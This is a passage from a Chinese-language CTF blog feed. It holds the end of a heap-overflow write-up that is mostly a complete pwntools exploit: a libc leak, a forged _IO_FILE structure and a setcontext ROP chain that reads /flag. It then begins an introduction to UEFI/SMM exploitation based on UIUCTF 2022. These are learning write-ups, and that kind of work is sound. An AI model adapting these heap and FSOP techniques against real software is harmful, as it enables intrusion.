class="keyword">func</span> <span class="title">MemMove</span><span class="params">(to, from unsafe.Pointer, n <span class="type">uintptr</span>)</span></span></span><br></pre></td></tr></table></figure><p>那么就存在堆溢出,之后的就是常规套路了</p><p>一份参考exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> bookProto_pb2</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;wt.exe&quot;</span>,<span class="string">&quot;wsl.exe&quot;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;../libc/&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def xxx():</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;&quot;)</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;&quot;)</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cont = bookProto_pb2.CTFBook()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_p</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">global</span> p,elf </span><br><span class="line">    <span class="comment"># p = process(name)</span></span><br><span class="line">    p = remote(<span class="string">&quot;8.147.133.230&quot;</span>,<span class="number">40626</span>)</span><br><span class="line">    elf = ELF(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,date,title=<span class="string">b&quot;AA&quot;</span>,author=<span class="string">b&quot;AAAA&quot;</span>,isbn=<span class="string">b&quot;AAA&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter your choice &gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">    cont.title = base64.b64encode(title)</span><br><span class="line">    cont.author = base64.b64encode(author)</span><br><span class="line">    cont.isbn = base64.b64encode(isbn)</span><br><span class="line">    cont.publish_date = base64.b64encode(date)</span><br><span class="line">    cont.price = <span class="number">41</span></span><br><span class="line">    cont.stock = <span class="number">1</span></span><br><span class="line">    payload = base64.b32encode(cont.SerializeToString())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Special Data:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,date,title=<span class="string">b&quot;AA&quot;</span>,author=<span class="string">b&quot;AAAA&quot;</span>,isbn=<span class="string">b&quot;AAA&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter your choice &gt;&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">    cont.title = base64.b64encode(title)</span><br><span class="line">    cont.author = base64.b64encode(author)</span><br><span class="line">    cont.isbn = base64.b64encode(isbn)</span><br><span class="line">    cont.publish_date = base64.b64encode(date)</span><br><span class="line">    cont.price = <span class="number">41</span></span><br><span class="line">    cont.stock = <span class="number">1</span></span><br><span class="line">    payload = base64.b32encode(cont.SerializeToString())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Special Data:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter your choice &gt;&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter your choice &gt;&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))    </span><br><span class="line">get_p(<span class="string">&quot;./SuperHeap&quot;</span>)</span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x430</span>,title=<span class="string">b&quot;BBBBB&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x430</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x430</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;A&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x2e90</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;A&quot;</span>*(<span class="number">0x70</span>+<span class="number">0x440</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x219ce0</span> - <span class="number">0x1000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x41</span>) + p64(heap_addr + <span class="number">0x2e90</span>) + p64(<span class="number">0x2cf0</span>+heap_addr) + p64(<span class="number">0x2b50</span>+heap_addr) + p64(libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]) + p64(<span class="number">0x4044800000000000</span>) + p64(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x3730</span>+heap_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x41</span>) + p64(heap_addr + <span class="number">0x2e90</span>) + p64(<span class="number">0x2cf0</span>+heap_addr) + p64(<span class="number">0x2b50</span>+heap_addr) + p64(heap_addr+<span class="number">0x3730</span>) + p64(<span class="number">0x4044800000000000</span>) + p64(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">fake_io_addr = heap_addr + <span class="number">0x3730</span></span><br><span class="line">_IO_wfile_jumps = libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line">ROP_addr = heap_addr + <span class="number">0x4000</span></span><br><span class="line">ret = <span class="number">0x000000000002a3e6</span> + libc.address</span><br><span class="line">setcontext = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x000000000002a3e5</span> + libc.address</span><br><span class="line">pop_rdx =  <span class="number">0x000000000011f2e7</span> + libc.address</span><br><span class="line">pop_rsi = <span class="number">0x000000000002be51</span> + libc.address</span><br><span class="line"></span><br><span class="line">FP = fake_io_addr</span><br><span class="line">A = FP + <span class="number">0x100</span></span><br><span class="line">B = A + <span class="number">0xe0</span> - <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0xa0</span>-<span class="number">0x10</span>)*<span class="string">b&quot;\x00&quot;</span> + p64(A) <span class="comment"># </span></span><br><span class="line">payload = payload.ljust(<span class="number">0xb0</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(<span class="number">1</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(_IO_wfile_jumps-<span class="number">0x40</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x190</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(ROP_addr) + p64(ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0xf0</span>+<span class="number">0xe0</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(B) + p64(setcontext + <span class="number">61</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x41</span>) + p64(heap_addr + <span class="number">0x2e90</span>) + p64(<span class="number">0x2cf0</span>+heap_addr) + p64(<span class="number">0x2b50</span>+heap_addr) + p64(heap_addr+<span class="number">0x4000</span>) + p64(<span class="number">0x4044800000000000</span>) + p64(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi) + p64(ROP_addr+<span class="number">0x100</span>) + p64(pop_rdx) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rdx) + p64(<span class="number">0x40</span>) *<span class="number">2</span> + p64(pop_rsi) + p64(heap_addr+<span class="number">0x1000</span>) + p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&quot;\x00&quot;</span>) + <span class="string">b&quot;/flag\x00&quot;</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *$rebase(0x020D1C7)&quot;)</span></span><br><span class="line"><span class="comment"># sleep(2)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Enter your choice &gt;&quot;</span>,<span class="string">&quot;6&quot;</span>)</span><br><span class="line"><span class="comment"># payload = b&quot;A&quot;*0x28 + p64(0x41) + p64(heap_addr + 0x2e90) + p64(0x2cf0+heap_addr) + p64(0x2b50+heap_addr) + p64(stack) + p64(0x4044800000000000) + p64(200)</span></span><br><span class="line"><span class="comment"># edit(0,payload)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">主要是逆向</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="protobuf" scheme="https://ixout.github.io/tags/protobuf/"/>
    
  </entry>
  
  <entry>
    <title>uefi-pwn初识</title>
    <link href="https://ixout.github.io/posts/36191/"/>
    <id>https://ixout.github.io/posts/36191/</id>
    <published>2024-04-06T14:37:09.000Z</published>
    <updated>2025-03-13T13:07:37.354Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>UEFI即Unified Extensible Firmware Interface(<strong>统一可扩展固件接口</strong>)是一种个人电脑系统规格，用来定义操作系统与系统固件之间的软件界面,作为BIOS的替代方案</p><p>更多可见wiki<a href="https://zh.wikipedia.org/wiki/%E7%B5%B1%E4%B8%80%E5%8F%AF%E5%BB%B6%E4%BC%B8%E9%9F%8C%E9%AB%94%E4%BB%8B%E9%9D%A2">https://zh.wikipedia.org/wiki/%E7%B5%B1%E4%B8%80%E5%8F%AF%E5%BB%B6%E4%BC%B8%E9%9F%8C%E9%AB%94%E4%BB%8B%E9%9D%A2</a></p><h2 id="UEFI组成"><a href="#UEFI组成" class="headerlink" title="UEFI组成"></a>UEFI组成</h2><p>一般认为，UEFI由以下几个部分组成：</p><ol><li>Pre-EFI初始化模块（PEI）</li><li>UEFI驱动程序执行环境（DXE）</li><li>UEFI驱动程序（UEFI driver）</li><li>兼容性支持模块（CSM）</li><li>UEFI高层应用（UEFI Application）</li><li>GUID磁盘分区表</li><li>系统管理模式（SMM）</li></ol><p>Pre-EFI初始化程序在系统开机的时候最先得到执行，它负责最初的CPU，芯片组及主存的初始化工作，<strong>紧接着加载UEFI的驱动程序执行环境（DXE）</strong>。</p><p>当DXE被加载运行时，系统便具有了枚举并加载其他UEFI驱动程序的能力。DXE枚举并加载各种总线（包括PCI、SATA、USB、ISA）及硬件的UEFI驱动程序。例如一个具PCI-E总线接口的RAID存储适配器，其UEFI驱动程序一般会放置在这个设备的Option ROM中。在UEFI规范中，一种突破传统MBR磁盘分区结构限制的GUID磁盘分区系统（GPT）被引入，新结构中，磁盘的主分区数不再受限制（在MBR结构下，只能存在4个主分区），另外UEFI+GPT结合还可以支持2.1 TB以上硬盘。</p><p>在众多的分区类型中，EFI系统分区可以被UEFI固件访问，可用于存放操作系统的引导程序。UEFI固件通过执行EFI系统分区中的启动程序启动操作系统]。</p><p>CSM是在x86平台UEFI系统中的一个特殊的模块，它将为不具备UEFI引导能力的操作系统以及16位的传统Option ROM提供类似于传统BIOS的系统服务。</p><p>在加载操作系统后，UEFI的SMM程序继续执行，提供ACPI等服务</p><h2 id="SMM"><a href="#SMM" class="headerlink" title="SMM"></a>SMM</h2><blockquote><p>系统管理模式（System Management mode）（以下简称SMM）是Intel在80386SL之后引入x86体系结构的一种CPU的执行模式。系统管理模式只能通过系统管理中断（System Management Interrupt, SMI）进入，并只能通过执行RSM指令退出。SMM模式对操作系统透明，换句话说，操作系统根本不知道系统何时进入SMM模式，也无法感知SMM模式曾经执行过。为了实现SMM，Intel在其CPU上新增了一个引脚SMI# Pin，当这个引脚上为高电平的时候，CPU会进入该模式。在SMM模式下一切被都屏蔽，包括所有的中断。SMM模式下的执行的程序被称作SMM处理程序，所有的SMM处理程序只能在称作系统管理内存（System Management RAM,SMRAM）的空间内运行。可以通过设置SMBASE的寄存器来设置SMRAM的空间。SMM处理程序只能由系统固件（如BIOS或UEFI）实现。</p><p><a href="https://en.wikipedia.org/wiki/System_Management_Mode">System Management Mode</a> is documented in <a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel SDM</a>, Volume 3C, Chapter 30. It is the operating mode with highest privilege, and sometimes referred to as “ring -2”. This mode has higher privilege than an OS/kernel (ring 0) and even an hypervisor (ring -1). It can only be entered through a System Management Interrupt (SMI), it has a separate address space completely invisible to other operating modes, and full access to all physical memory, MSRs, control registers etc.</p></blockquote><p>SMM有时被称作 <code>ring -2</code>,因为其具有最高级别权限<strong>,唯一进入该模式的方式只有SMI</strong>(系统管理中断)</p><p>处理器执行<em>SMM</em>代码的时候是在一个单独的地址空间（<em>SMRAM</em>）下完成的，并且这段地址空间在其他模式下是绝对不能被访问的</p><p>SMI 可以由软件使用 IO 端口 <code>0xB2</code> 触发(<u>outb dx, al</u>)，并且此功能可用于实现 SMM 和非 SMM 代码之间的某种受控通信机制。并通过<code>RSM</code>指令退出SMM</p><h2 id="UEFI与操作系统的关系"><a href="#UEFI与操作系统的关系" class="headerlink" title="UEFI与操作系统的关系"></a>UEFI与操作系统的关系</h2><p>UEFI在概念上类似于一个低阶的操作系统，并且具有操控所有硬件资源的能力。不少人感觉它的不断发展将有可能代替现代的操作系统。事实上，EFI的缔造者们在第一版规范出台时就将EFI的能力限制于不足以威胁操作系统的统治地位。</p><p>首先，它只是硬件和预启动软件间的接口规范；其次，UEFI环境下<strong>不提供中断的机制</strong>，也就是说每个UEFI驱动程序必须用<strong>轮询</strong>（polling）的方式来检查硬件状态，并且需要以<strong>解释</strong>的方式运行，较操作系统下的机械码驱动效率更低；再则，UEFI系统不提供复杂的缓存器保护功能，它只具备简单的缓存器管理机制，具体来说就是指运行在x64或x86处理器的长模式或保护模式下，以最大寻址能力为限把缓存器分为一个平坦的段（Segment），所有的程序都有权限访问任何一段位置，并不提供真实的保护服务。</p><p>当UEFI所有组件加载完毕时，便会启动操作系统的启动程序，如果UEFI固件内置UEFI Shell，也可以启动UEFI Shell命令提示。<u>UEFI应用程序（UEFI Application）和UEFI驱动程序（UEFI driver）是PE格式的.efi文件，可用C语言编写。</u>在UEFI引导模式下，操作系统的启动程序也是UEFI应用程序，启动程序的EFI文件存储在EFI系统分区（ESP）上。</p><p>UEFI固件区分架构，在UEFI引导模式下，通常只能执行特定架构的UEFI操作系统和特定架构的EFI应用程序（EBC程序除外）。比如，采用64位UEFI固件的PC，在UEFI引导模式下只能执行64位操作系统启动程序；而在Legacy引导模式（即BIOS兼容引导模式）下，既可以执行16位的操作系统（如DOS），也可以执行32位操作系统和64位操作系统。</p><h2 id="EDK2"><a href="#EDK2" class="headerlink" title="EDK2"></a>EDK2</h2><p><a href="https://github.com/tianocore/edk2/tree/master">tianocore/edk2: EDK II</a></p><p>EDK2（EFI Development Kit II）是一个开源的项目，它提供了一个用于开发 UEFI（统一扩展固件接口）固件的全面工具和框架。</p><p>也是事实上的UEFI的实现</p><p>我们做的题目都是是基于EDK2,大多数时候给的是OVMF.fd</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="uictf2022-cowsay1"><a href="#uictf2022-cowsay1" class="headerlink" title="uictf2022-cowsay1"></a>uictf2022-cowsay1</h2><p>参考<a href="https://ctftime.org/writeup/34881">CTFtime.org / UIUCTF 2022 / SMM Cowsay 1 / Writeup</a></p><p><strong>learn interface</strong></p><h3 id="摸索"><a href="#摸索" class="headerlink" title="摸索"></a>摸索</h3><p>我们收到的文件包含：</p><ul><li>构建的挑战二进制文件以及 <code>qemu-system-x86_64</code> 二进制文件和启动脚本提供了在本地运行挑战所需的参数。</li><li>挑战赛的源代码是 EDK2（事实上的标准 UEFI 实现）和 QEMU 的一系列补丁，以及用于应用它们并构建所有内容的 <code>Dockerfile</code> 。</li><li>为远程运行的挑战而完成的构建的 EDK2 构建工件（即带有有用调试符号的二进制文件）。</li></ul><p>运行挑战时，我们会收到以下消息：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">UEFI Interactive Shell v2.2</span><br><span class="line">EDK II</span><br><span class="line">UEFI v2.70 (EDK II, 0x00010000)</span><br><span class="line">Shell&gt; binexec</span><br><span class="line"> ____________________________________________________________________</span><br><span class="line">/ Welcome to binexec!                                                \</span><br><span class="line">| Type some shellcode <span class="keyword">in</span> hex and I<span class="string">&#x27;ll run it!                        |</span></span><br><span class="line"><span class="string">|                                                                    |</span></span><br><span class="line"><span class="string">| Type the word &#x27;</span><span class="keyword">done</span><span class="string">&#x27; on a seperate line and press enter to execute |</span></span><br><span class="line"><span class="string">\ Type &#x27;</span><span class="built_in">exit</span><span class="string">&#x27; on a seperate line and press enter to quit the program /</span></span><br><span class="line"><span class="string"> --------------------------------------------------------------------</span></span><br><span class="line"><span class="string">                    \   ^__^</span></span><br><span class="line"><span class="string">                     \  (oo)\_______</span></span><br><span class="line"><span class="string">                        (__)\       )\/\</span></span><br><span class="line"><span class="string">                            ||----w |</span></span><br><span class="line"><span class="string">                            ||     ||</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Address of SystemTable: 0x00000000069EE018</span></span><br><span class="line"><span class="string">Address where I&#x27;</span>m gonna run your code: 0x000000000517D100</span><br></pre></td></tr></table></figure><p>其启动了一个<a href="https://github.com/pbatard/UEFI-Shell">uefishell</a>,事实上大多数uefi的题目使用的都是该开源软件,然后在其上进行一些patch</p><h3 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h3><p>EDK2 补丁 <code>0003-SmmCowsay-Vulnerable-Cowsay.patch</code> 实现了一个名为 <code>SmmCowsay.efi</code> 的 UEFI SMM 驱动程序：该驱动程序将在 SMM 中运行，并注册一个要执行的处理程序（通过 <code>SmiHandlerRegister</code> 函数）在 SMM 中，打印文本的方式与owsay Linux 命令非常相似：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status = gSmst-&gt;SmiHandlerRegister (</span><br><span class="line">                  SmmCowsayHandler,</span><br><span class="line">                  &amp;gEfiSmmCowsayCommunicationGuid,</span><br><span class="line">                  &amp;DispatchHandle</span><br><span class="line">                  );</span><br></pre></td></tr></table></figure><p><strong>当 SMI 发生时，EDK2 注册的 SMI 处理程序会遍历已注册处理程序的链接列表，并选择合适的处理程序来运行。</strong></p><p>下一个补丁 <code>0004-Add-UEFI-Binexec.patch</code> 实现了一个名为 <code>Binexec.efi</code> 的普通UEFI驱动程序，它将与我们交互（通过控制台输入/输出）并与 <code>SmmCowsay.efi</code> 驱动程序交互以打印我们在运行挑战时看到上面的问候横幅。</p><p>为了与 <code>SmmCowsay.efi</code> 驱动程序进行通信， <code>Binexec.efi</code> 通过 <code>EFI_SMM_COMMUNICATION_PROTOCOL</code> 结构体提供的 <code>-&gt;Communicate()</code> 方法发送一条“消息”：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mSmmCommunication-&gt;Communicate(</span><br><span class="line">    mSmmCommunication, <span class="comment">// &quot;THIS&quot; pointer</span></span><br><span class="line">    Buffer,            <span class="comment">// Pointer to message of type EFI_SMM_COMMUNICATE_HEADER</span></span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>该函数将消息复制到全局变量中并触发软件 SMI 来处理它。该消息包含我们想要通信的SMM处理程序的GUID，进入SMM时在已注册处理程序的链表中搜索该GUID。</p><p><code>Binexec.efi</code> 驱动程序将简单地在循环中运行，要求我们提供一些十六进制形式的代码，将其复制到 RWX 内存区域，然后跳转到其中（使用程序集包装器保存/恢复寄存器）。这意味着我们能够在 UEFI 驱动程序内运行任意代码，该驱动程序以超级用户模式（也称为 Ring 0）运行。</p><p>QEMU 补丁实现了一个自定义 MMIO 设备，该设备只需读取主机上的 <code>region4</code> 文件，并创建一个从物理地址 <code>0x44440000</code> 开始、大小为 <code>0x1000</code> 的 MMIO 内存区域。保存该文件的内容。这意味着访问地址 <code>0x44440000</code> 处的物理内存将调用 QEMU 设备读/写操作 ( <code>MemoryRegionOps</code> )，这将决定如何处理内存读/写。</p><p>读取操作处理程序 ( <code>uiuctfmmio_region4_read_with_attrs()</code> ) 执行检查，确保读取在传递给函数的 <code>MemTxAttrs</code> 结构中设置了 <code>.secure</code> 标志，这意味着读取由SMM发出。如果不是这种情况，则会返回一个假标志：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> MemTxResult <span class="title function_">uiuctfmmio_region4_read_with_attrs</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> *val, <span class="type">unsigned</span> size, MemTxAttrs attrs)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!attrs.secure)</span><br><span class="line">        uiuctfmmio_do_read(addr, val, size, nice_try_msg, nice_try_len);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        uiuctfmmio_do_read(addr, val, size, region4_msg, region4_len);</span><br><span class="line">    <span class="keyword">return</span> MEMTX_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="EFI-System-Table"><a href="#EFI-System-Table" class="headerlink" title="EFI System Table"></a>EFI System Table</h3><p>打印给我们的信息,还让我们获得了 <code>SystemTable</code> 的地址以及 shellcode 将复制（和运行）的地址。在 UEFI 规范上花费的时间可能超出了所需的时间，它包含了我们了解其含义所需的所有信息。</p><p><code>SystemTable</code> 是 EFI 系统表，它是一个包含在 UEFI 驱动程序中执行任何操作所需的所有信息的结构。它保存了一堆指向其他结构的指针，这些结构实际上保存了另一堆指向 API 方法、配置变量等的指针。</p><blockquote><p>UEFI uses the EFI System Table, which contains pointers to the runtime and boot services tables. The definition for this table is shown in the following code fragments. Except for the table header, all elements in the service tables are pointers to functions as defined in <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#services-boot-services">Services — Boot Services</a> and <a href="https://uefi.org/specs/UEFI/2.10/08_Services_Runtime_Services.html#services-runtime-services">Services — Runtime Services</a> . Prior to a call to <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#efi-boot-services-exitbootservices">EFI_BOOT_SERVICES.ExitBootServices()</a> , all of the fields of the EFI System Table are valid. After an operating system has taken control of the platform with a call to <em>ExitBootServices()</em> , only the <em>Hdr</em> , <em>FirmwareVendor</em> , <em>FirmwareRevision</em> , <em>RuntimeServices</em> , <em>NumberOfTableEntries</em> , and <em>ConfigurationTable</em> fields are valid.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 